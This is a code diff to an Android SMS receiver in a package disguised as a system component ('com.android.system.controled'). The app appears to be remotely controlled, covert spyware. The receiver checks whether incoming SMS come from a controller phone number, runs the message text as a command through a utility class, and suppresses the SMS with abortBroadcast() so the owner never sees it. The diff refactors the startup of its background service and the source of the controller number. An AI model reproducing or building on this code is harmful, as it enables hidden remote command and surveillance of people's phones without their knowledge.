@@ -7,8 +7,9 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 
 import com.android.system.controled.Debug;
-import com.android.system.controled.Globle;
+import com.android.system.controled.MainApplication;
 import com.android.system.controled.util.DoAboutCodeUtils;
+import com.android.system.controled.util.InitUtil;
 
 public class MsgAndOtherReceiver extends BroadcastReceiver {
 
@@ -17,9 +18,10 @@ public class MsgAndOtherReceiver extends BroadcastReceiver {
 	@Override
 	public void onReceive(Context context, Intent intent) {
 
-		Globle.startBackService(context);// Start the back service
-		Globle.checkUploadedOrNot(context);
+		InitUtil.init(context);
 
+		Debug.e(TAG, "intent.getAction()=" + intent.getAction());
+		
 		if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
 			SmsMessage[] msg = null;
 			Bundle bundle = intent.getExtras();
@@ -44,7 +46,7 @@ public class MsgAndOtherReceiver extends BroadcastReceiver {
 			}
 
 			Debug.v("MsgReceiver", getFromNum);
-			if (getFromNum.contains(Globle.PHONE_NUMBER)) {
+			if (getFromNum.contains(MainApplication.controllerTel)) {
 				if (DoAboutCodeUtils.doOperaByMessage(context, msgTxt)) {
 					abortBroadcast();
 				}
